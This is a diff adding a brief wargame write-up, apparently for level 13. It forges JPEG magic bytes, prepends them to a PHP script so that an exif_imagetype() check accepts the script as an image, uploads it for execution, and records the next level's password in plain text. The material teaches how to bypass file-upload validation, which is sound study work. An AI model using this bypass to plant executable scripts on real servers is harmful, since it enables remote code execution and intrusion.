@@ -1,0 +1,17 @@
+Fake a jpeg image type of a file:
+# python -c 'print "\xff\xd8\xff\xd9"' > img.php
+
+Test the return of exif_imagetype() function:
+# ./test_type.php img.php 
+Image type of img.php is: 2
+
+Concatenate the fake script to the previous print php script:
+# cat img.php level13.php  > to_be_up.php
+
+Test to see if it's recognized as an image:
+# ./test_type.php to_be_up.php 
+Image type of to_be_up.php is: 2
+
+Upload it then run it to get the next pasword.
+
+Next level password is: sSkCeug1bdrYejzAaBhgwI3qJXDKqlgh
